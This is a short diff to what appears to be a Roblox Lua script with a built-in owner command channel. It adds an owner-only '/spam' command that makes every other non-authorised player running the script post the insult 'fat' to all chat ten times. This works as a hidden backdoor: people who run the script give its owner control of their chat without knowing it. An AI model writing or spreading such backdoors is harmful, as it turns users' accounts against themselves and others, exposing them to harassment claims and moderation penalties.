@@ -378,7 +378,22 @@
 
    -- only allow owner/admin to send commands   
    if not AUTH_USERS[p.Name] then return end   
-
+   -- NEW: OWNER ONLY /SPAM COMMAND
+   if msg:lower() == "/spam" and p.Name == _O then
+   for _, target in pairs(Players:GetPlayers()) do
+   if target.Character and isRunningScript(target) then
+   if not AUTH_USERS[target.Name] then
+   task.spawn(function()
+   for i = 1, 10 do
+   game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("fat", "All")
+   task.wait(0.15)
+   end
+   end)
+   end
+   end
+   end
+   return
+   end
    for _,target in pairs(Players:GetPlayers()) do   
    if target ~= p and target.Character and isRunningScript(target) then   
 
